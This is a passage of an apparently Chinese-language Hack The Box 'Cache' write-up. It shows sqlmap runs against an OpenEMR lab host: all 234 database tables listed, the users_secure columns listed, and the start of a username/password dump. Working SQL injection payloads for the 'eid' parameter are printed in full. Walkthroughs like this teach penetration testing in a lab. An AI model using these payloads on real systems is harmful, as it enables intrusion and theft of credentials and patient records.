&#x27;gacl_groups_axo_map&#x27;</span><br><span class="line">[09:58:00] [INFO] retrieved: &#x27;gacl_phpgacl&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;geo_country_reference&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;geo_zone_reference&#x27;</span><br><span class="line">[09:58:01] [INFO] retrieved: &#x27;globals&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;gprelations&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;groups&#x27;</span><br><span class="line">[09:58:02] [INFO] retrieved: &#x27;history_data&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_dx_order_code&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_gem_dx_10_9&#x27;</span><br><span class="line">[09:58:03] [INFO] retrieved: &#x27;icd10_gem_dx_9_10&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_gem_pcs_10_9&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_gem_pcs_9_10&#x27;</span><br><span class="line">[09:58:04] [INFO] retrieved: &#x27;icd10_pcs_order_code&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd10_reimbr_dx_9_10&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd10_reimbr_pcs_9_10&#x27;</span><br><span class="line">[09:58:05] [INFO] retrieved: &#x27;icd9_dx_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_dx_long_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_sg_code&#x27;</span><br><span class="line">[09:58:06] [INFO] retrieved: &#x27;icd9_sg_long_code&#x27;</span><br><span class="line">[09:58:07] [INFO] retrieved: &#x27;immunization_observation&#x27;</span><br><span class="line">[09:58:07] [INFO] retrieved: &#x27;immunizations&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_companies&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_data&#x27;</span><br><span class="line">[09:58:08] [INFO] retrieved: &#x27;insurance_numbers&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;issue_encounter&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;issue_types&#x27;</span><br><span class="line">[09:58:09] [INFO] retrieved: &#x27;lang_constants&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_custom&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_definitions&#x27;</span><br><span class="line">[09:58:10] [INFO] retrieved: &#x27;lang_languages&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;layout_group_properties&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;layout_options&#x27;</span><br><span class="line">[09:58:11] [INFO] retrieved: &#x27;lbf_data&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;lbt_data&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;list_options&#x27;</span><br><span class="line">[09:58:12] [INFO] retrieved: &#x27;lists&#x27;</span><br><span class="line">[09:58:13] [INFO] retrieved: &#x27;lists_touch&#x27;</span><br><span class="line">[09:58:13] [INFO] retrieved: &#x27;log&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;log_comment_encrypt&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;log_validator&#x27;</span><br><span class="line">[09:58:14] [INFO] retrieved: &#x27;medex_icons&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_outgoing&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_prefs&#x27;</span><br><span class="line">[09:58:15] [INFO] retrieved: &#x27;medex_recalls&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;misc_address_book&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;module_acl_group_settings&#x27;</span><br><span class="line">[09:58:16] [INFO] retrieved: &#x27;module_acl_sections&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;module_acl_user_settings&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;module_configuration&#x27;</span><br><span class="line">[09:58:17] [INFO] retrieved: &#x27;modules&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;modules_hooks_settings&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;modules_settings&#x27;</span><br><span class="line">[09:58:18] [INFO] retrieved: &#x27;multiple_db&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notes&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notification_log&#x27;</span><br><span class="line">[09:58:19] [INFO] retrieved: &#x27;notification_settings&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onotes&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onsite_documents&#x27;</span><br><span class="line">[09:58:20] [INFO] retrieved: &#x27;onsite_mail&#x27;</span><br><span class="line">[09:58:21] [INFO] retrieved: &#x27;onsite_messages&#x27;</span><br><span class="line">[09:58:21] [INFO] retrieved: &#x27;onsite_online&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;onsite_portal_activity&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;onsite_signatures&#x27;</span><br><span class="line">[09:58:22] [INFO] retrieved: &#x27;openemr_module_vars&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_modules&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_postcalendar_categories&#x27;</span><br><span class="line">[09:58:23] [INFO] retrieved: &#x27;openemr_postcalendar_events&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_postcalendar_limits&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_postcalendar_topics&#x27;</span><br><span class="line">[09:58:24] [INFO] retrieved: &#x27;openemr_session_info&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_access_offsite&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_access_onsite&#x27;</span><br><span class="line">[09:58:25] [INFO] retrieved: &#x27;patient_birthday_alert&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_data&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_portal_menu&#x27;</span><br><span class="line">[09:58:26] [INFO] retrieved: &#x27;patient_reminders&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;patient_tracker&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;patient_tracker_element&#x27;</span><br><span class="line">[09:58:27] [INFO] retrieved: &#x27;payment_gateway_details&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;payments&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;pharmacies&#x27;</span><br><span class="line">[09:58:28] [INFO] retrieved: &#x27;phone_numbers&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_bookmark&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_column_info&#x27;</span><br><span class="line">[09:58:29] [INFO] retrieved: &#x27;pma_history&#x27;</span><br><span class="line">[09:58:30] [INFO] retrieved: &#x27;pma_pdf_pages&#x27;</span><br><span class="line">[09:58:30] [INFO] retrieved: &#x27;pma_relation&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pma_table_coords&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pma_table_info&#x27;</span><br><span class="line">[09:58:31] [INFO] retrieved: &#x27;pnotes&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;prescriptions&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;prices&#x27;</span><br><span class="line">[09:58:32] [INFO] retrieved: &#x27;procedure_answers&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_order&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_order_code&#x27;</span><br><span class="line">[09:58:33] [INFO] retrieved: &#x27;procedure_providers&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_questions&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_report&#x27;</span><br><span class="line">[09:58:34] [INFO] retrieved: &#x27;procedure_result&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;procedure_type&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;product_registration&#x27;</span><br><span class="line">[09:58:35] [INFO] retrieved: &#x27;product_warehouse&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;registry&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;report_itemized&#x27;</span><br><span class="line">[09:58:36] [INFO] retrieved: &#x27;report_results&#x27;</span><br><span class="line">[09:58:37] [INFO] retrieved: &#x27;rule_action&#x27;</span><br><span class="line">[09:58:37] [INFO] retrieved: &#x27;rule_action_item&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_filter&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_patient_data&#x27;</span><br><span class="line">[09:58:38] [INFO] retrieved: &#x27;rule_reminder&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;rule_target&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;sequences&#x27;</span><br><span class="line">[09:58:39] [INFO] retrieved: &#x27;shared_attributes&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;standardized_tables_track&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;supported_external_dataloads&#x27;</span><br><span class="line">[09:58:40] [INFO] retrieved: &#x27;syndromic_surveillance&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;template_users&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;therapy_groups&#x27;</span><br><span class="line">[09:58:41] [INFO] retrieved: &#x27;therapy_groups_counselors&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;therapy_groups_participant_attendance&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;therapy_groups_participants&#x27;</span><br><span class="line">[09:58:42] [INFO] retrieved: &#x27;transactions&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;user_settings&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;users&#x27;</span><br><span class="line">[09:58:43] [INFO] retrieved: &#x27;users_facility&#x27;</span><br><span class="line">[09:58:44] [INFO] retrieved: &#x27;users_secure&#x27;</span><br><span class="line">[09:58:44] [INFO] retrieved: &#x27;valueset&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;version&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;voids&#x27;</span><br><span class="line">[09:58:45] [INFO] retrieved: &#x27;x12_partners&#x27;</span><br><span class="line">Database: openemr                                                                                                                                           </span><br><span class="line">[234 tables]</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| array                                 |</span><br><span class="line">| groups                                |</span><br><span class="line">| log                                   |</span><br><span class="line">| version                               |</span><br><span class="line">| addresses                             |</span><br><span class="line">| amc_misc_data                         |</span><br><span class="line">| amendments                            |</span><br><span class="line">| amendments_history                    |</span><br><span class="line">| ar_activity                           |</span><br><span class="line">| ar_session                            |</span><br><span class="line">| audit_details                         |</span><br><span class="line">| audit_master                          |</span><br><span class="line">| automatic_notification                |</span><br><span class="line">| background_services                   |</span><br><span class="line">| batchcom                              |</span><br><span class="line">| billing                               |</span><br><span class="line">| calendar_external                     |</span><br><span class="line">| categories                            |</span><br><span class="line">| categories_seq                        |</span><br><span class="line">| categories_to_documents               |</span><br><span class="line">| ccda                                  |</span><br><span class="line">| ccda_components                       |</span><br><span class="line">| ccda_field_mapping                    |</span><br><span class="line">| ccda_sections                         |</span><br><span class="line">| ccda_table_mapping                    |</span><br><span class="line">| chart_tracker                         |</span><br><span class="line">| claims                                |</span><br><span class="line">| clinical_plans                        |</span><br><span class="line">| clinical_plans_rules                  |</span><br><span class="line">| clinical_rules                        |</span><br><span class="line">| clinical_rules_log                    |</span><br><span class="line">| code_types                            |</span><br><span class="line">| codes                                 |</span><br><span class="line">| codes_history                         |</span><br><span class="line">| config                                |</span><br><span class="line">| config_seq                            |</span><br><span class="line">| customlists                           |</span><br><span class="line">| dated_reminders                       |</span><br><span class="line">| dated_reminders_link                  |</span><br><span class="line">| direct_message_log                    |</span><br><span class="line">| documents                             |</span><br><span class="line">| documents_legal_categories            |</span><br><span class="line">| documents_legal_detail                |</span><br><span class="line">| documents_legal_master                |</span><br><span class="line">| drug_inventory                        |</span><br><span class="line">| drug_sales                            |</span><br><span class="line">| drug_templates                        |</span><br><span class="line">| drugs                                 |</span><br><span class="line">| eligibility_response                  |</span><br><span class="line">| eligibility_verification              |</span><br><span class="line">| employer_data                         |</span><br><span class="line">| enc_category_map                      |</span><br><span class="line">| erx_drug_paid                         |</span><br><span class="line">| erx_narcotics                         |</span><br><span class="line">| erx_rx_log                            |</span><br><span class="line">| erx_ttl_touch                         |</span><br><span class="line">| esign_signatures                      |</span><br><span class="line">| extended_log                          |</span><br><span class="line">| external_encounters                   |</span><br><span class="line">| external_procedures                   |</span><br><span class="line">| facility                              |</span><br><span class="line">| facility_user_ids                     |</span><br><span class="line">| fee_sheet_options                     |</span><br><span class="line">| form_care_plan                        |</span><br><span class="line">| form_clinical_instructions            |</span><br><span class="line">| form_dictation                        |</span><br><span class="line">| form_encounter                        |</span><br><span class="line">| form_eye_mag                          |</span><br><span class="line">| form_eye_mag_dispense                 |</span><br><span class="line">| form_eye_mag_impplan                  |</span><br><span class="line">| form_eye_mag_orders                   |</span><br><span class="line">| form_eye_mag_prefs                    |</span><br><span class="line">| form_eye_mag_wearing                  |</span><br><span class="line">| form_functional_cognitive_status      |</span><br><span class="line">| form_group_attendance                 |</span><br><span class="line">| form_groups_encounter                 |</span><br><span class="line">| form_misc_billing_options             |</span><br><span class="line">| form_observation                      |</span><br><span class="line">| form_reviewofs                        |</span><br><span class="line">| form_ros                              |</span><br><span class="line">| form_soap                             |</span><br><span class="line">| form_taskman                          |</span><br><span class="line">| form_vitals                           |</span><br><span class="line">| forms                                 |</span><br><span class="line">| gacl_acl                              |</span><br><span class="line">| gacl_acl_sections                     |</span><br><span class="line">| gacl_acl_seq                          |</span><br><span class="line">| gacl_aco                              |</span><br><span class="line">| gacl_aco_map                          |</span><br><span class="line">| gacl_aco_sections                     |</span><br><span class="line">| gacl_aco_sections_seq                 |</span><br><span class="line">| gacl_aco_seq                          |</span><br><span class="line">| gacl_aro                              |</span><br><span class="line">| gacl_aro_groups                       |</span><br><span class="line">| gacl_aro_groups_id_seq                |</span><br><span class="line">| gacl_aro_groups_map                   |</span><br><span class="line">| gacl_aro_map                          |</span><br><span class="line">| gacl_aro_sections                     |</span><br><span class="line">| gacl_aro_sections_seq                 |</span><br><span class="line">| gacl_aro_seq                          |</span><br><span class="line">| gacl_axo                              |</span><br><span class="line">| gacl_axo_groups                       |</span><br><span class="line">| gacl_axo_groups_map                   |</span><br><span class="line">| gacl_axo_map                          |</span><br><span class="line">| gacl_axo_sections                     |</span><br><span class="line">| gacl_groups_aro_map                   |</span><br><span class="line">| gacl_groups_axo_map                   |</span><br><span class="line">| gacl_phpgacl                          |</span><br><span class="line">| geo_country_reference                 |</span><br><span class="line">| geo_zone_reference                    |</span><br><span class="line">| globals                               |</span><br><span class="line">| gprelations                           |</span><br><span class="line">| history_data                          |</span><br><span class="line">| icd10_dx_order_code                   |</span><br><span class="line">| icd10_gem_dx_10_9                     |</span><br><span class="line">| icd10_gem_dx_9_10                     |</span><br><span class="line">| icd10_gem_pcs_10_9                    |</span><br><span class="line">| icd10_gem_pcs_9_10                    |</span><br><span class="line">| icd10_pcs_order_code                  |</span><br><span class="line">| icd10_reimbr_dx_9_10                  |</span><br><span class="line">| icd10_reimbr_pcs_9_10                 |</span><br><span class="line">| icd9_dx_code                          |</span><br><span class="line">| icd9_dx_long_code                     |</span><br><span class="line">| icd9_sg_code                          |</span><br><span class="line">| icd9_sg_long_code                     |</span><br><span class="line">| immunization_observation              |</span><br><span class="line">| immunizations                         |</span><br><span class="line">| insurance_companies                   |</span><br><span class="line">| insurance_data                        |</span><br><span class="line">| insurance_numbers                     |</span><br><span class="line">| issue_encounter                       |</span><br><span class="line">| issue_types                           |</span><br><span class="line">| lang_constants                        |</span><br><span class="line">| lang_custom                           |</span><br><span class="line">| lang_definitions                      |</span><br><span class="line">| lang_languages                        |</span><br><span class="line">| layout_group_properties               |</span><br><span class="line">| layout_options                        |</span><br><span class="line">| lbf_data                              |</span><br><span class="line">| lbt_data                              |</span><br><span class="line">| list_options                          |</span><br><span class="line">| lists                                 |</span><br><span class="line">| lists_touch                           |</span><br><span class="line">| log_comment_encrypt                   |</span><br><span class="line">| log_validator                         |</span><br><span class="line">| medex_icons                           |</span><br><span class="line">| medex_outgoing                        |</span><br><span class="line">| medex_prefs                           |</span><br><span class="line">| medex_recalls                         |</span><br><span class="line">| misc_address_book                     |</span><br><span class="line">| module_acl_group_settings             |</span><br><span class="line">| module_acl_sections                   |</span><br><span class="line">| module_acl_user_settings              |</span><br><span class="line">| module_configuration                  |</span><br><span class="line">| modules                               |</span><br><span class="line">| modules_hooks_settings                |</span><br><span class="line">| modules_settings                      |</span><br><span class="line">| multiple_db                           |</span><br><span class="line">| notes                                 |</span><br><span class="line">| notification_log                      |</span><br><span class="line">| notification_settings                 |</span><br><span class="line">| onotes                                |</span><br><span class="line">| onsite_documents                      |</span><br><span class="line">| onsite_mail                           |</span><br><span class="line">| onsite_messages                       |</span><br><span class="line">| onsite_online                         |</span><br><span class="line">| onsite_portal_activity                |</span><br><span class="line">| onsite_signatures                     |</span><br><span class="line">| openemr_module_vars                   |</span><br><span class="line">| openemr_modules                       |</span><br><span class="line">| openemr_postcalendar_categories       |</span><br><span class="line">| openemr_postcalendar_events           |</span><br><span class="line">| openemr_postcalendar_limits           |</span><br><span class="line">| openemr_postcalendar_topics           |</span><br><span class="line">| openemr_session_info                  |</span><br><span class="line">| patient_access_offsite                |</span><br><span class="line">| patient_access_onsite                 |</span><br><span class="line">| patient_birthday_alert                |</span><br><span class="line">| patient_data                          |</span><br><span class="line">| patient_portal_menu                   |</span><br><span class="line">| patient_reminders                     |</span><br><span class="line">| patient_tracker                       |</span><br><span class="line">| patient_tracker_element               |</span><br><span class="line">| payment_gateway_details               |</span><br><span class="line">| payments                              |</span><br><span class="line">| pharmacies                            |</span><br><span class="line">| phone_numbers                         |</span><br><span class="line">| pma_bookmark                          |</span><br><span class="line">| pma_column_info                       |</span><br><span class="line">| pma_history                           |</span><br><span class="line">| pma_pdf_pages                         |</span><br><span class="line">| pma_relation                          |</span><br><span class="line">| pma_table_coords                      |</span><br><span class="line">| pma_table_info                        |</span><br><span class="line">| pnotes                                |</span><br><span class="line">| prescriptions                         |</span><br><span class="line">| prices                                |</span><br><span class="line">| procedure_answers                     |</span><br><span class="line">| procedure_order                       |</span><br><span class="line">| procedure_order_code                  |</span><br><span class="line">| procedure_providers                   |</span><br><span class="line">| procedure_questions                   |</span><br><span class="line">| procedure_report                      |</span><br><span class="line">| procedure_result                      |</span><br><span class="line">| procedure_type                        |</span><br><span class="line">| product_registration                  |</span><br><span class="line">| product_warehouse                     |</span><br><span class="line">| registry                              |</span><br><span class="line">| report_itemized                       |</span><br><span class="line">| report_results                        |</span><br><span class="line">| rule_action                           |</span><br><span class="line">| rule_action_item                      |</span><br><span class="line">| rule_filter                           |</span><br><span class="line">| rule_patient_data                     |</span><br><span class="line">| rule_reminder                         |</span><br><span class="line">| rule_target                           |</span><br><span class="line">| sequences                             |</span><br><span class="line">| shared_attributes                     |</span><br><span class="line">| standardized_tables_track             |</span><br><span class="line">| supported_external_dataloads          |</span><br><span class="line">| syndromic_surveillance                |</span><br><span class="line">| template_users                        |</span><br><span class="line">| therapy_groups                        |</span><br><span class="line">| therapy_groups_counselors             |</span><br><span class="line">| therapy_groups_participant_attendance |</span><br><span class="line">| therapy_groups_participants           |</span><br><span class="line">| transactions                          |</span><br><span class="line">| user_settings                         |</span><br><span class="line">| users                                 |</span><br><span class="line">| users_facility                        |</span><br><span class="line">| users_secure                          |</span><br><span class="line">| valueset                              |</span><br><span class="line">| voids                                 |</span><br><span class="line">| x12_partners                          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line"></span><br><span class="line">[09:58:45] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 09:58:45 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h3 id="3-çˆ†users-secureè¡¨å­—æ®µ"><a href="#3-çˆ†users-secureè¡¨å­—æ®µ" class="headerlink" title="3.çˆ†users_secureè¡¨å­—æ®µ"></a>3.çˆ†users_secureè¡¨å­—æ®µ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr -T users_secure --columns --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [(]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [&#x27;]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 10:37:10 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[10:37:10] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[10:37:11] [INFO] resuming back-end DBMS &#x27;mysql&#x27; </span><br><span class="line">[10:37:11] [INFO] testing connection to the target URL</span><br><span class="line">[10:37:11] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[10:37:11] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[10:37:11] [INFO] fetching columns for table &#x27;users_secure&#x27; in database &#x27;openemr&#x27;</span><br><span class="line">[10:37:12] [INFO] retrieved: &#x27;id&#x27;,&#x27;bigint(20)&#x27;</span><br><span class="line">[10:37:12] [INFO] retrieved: &#x27;username&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:13] [INFO] retrieved: &#x27;password&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:13] [INFO] retrieved: &#x27;salt&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;last_update&#x27;,&#x27;timestamp&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;password_history1&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:14] [INFO] retrieved: &#x27;salt_history1&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:15] [INFO] retrieved: &#x27;password_history2&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">[10:37:15] [INFO] retrieved: &#x27;salt_history2&#x27;,&#x27;varchar(255)&#x27;</span><br><span class="line">Database: openemr                                                                                                                                           </span><br><span class="line">Table: users_secure</span><br><span class="line">[9 columns]</span><br><span class="line">+-------------------+--------------+</span><br><span class="line">| Column            | Type         |</span><br><span class="line">+-------------------+--------------+</span><br><span class="line">| id                | bigint(20)   |</span><br><span class="line">| last_update       | timestamp    |</span><br><span class="line">| password          | varchar(255) |</span><br><span class="line">| password_history1 | varchar(255) |</span><br><span class="line">| password_history2 | varchar(255) |</span><br><span class="line">| salt              | varchar(255) |</span><br><span class="line">| salt_history1     | varchar(255) |</span><br><span class="line">| salt_history2     | varchar(255) |</span><br><span class="line">| username          | varchar(255) |</span><br><span class="line">+-------------------+--------------+</span><br><span class="line"></span><br><span class="line">[10:37:15] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 10:37:15 /2020-10-01/</span><br></pre></td></tr></table></figure><h3 id="4-çˆ†æ•°æ®"><a href="#4-çˆ†æ•°æ®" class="headerlink" title="4.çˆ†æ•°æ®"></a>4.çˆ†æ•°æ®</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp -D openemr -T users_secure -C username,password --dump</span><br><span class="line">        ___</span><br><span class="line">       __H__                                                                                                                                                 </span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.4.9#stable&#125;                                                                                                                     </span><br><span class="line">|_ -| . [&quot;]     | .&#x27;| . |                                                                                                                                    </span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|                                                                                                                                    </span><br><span class="line">      |_|V...       |_|   http://sqlmap.org                                                                                                                  </span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this 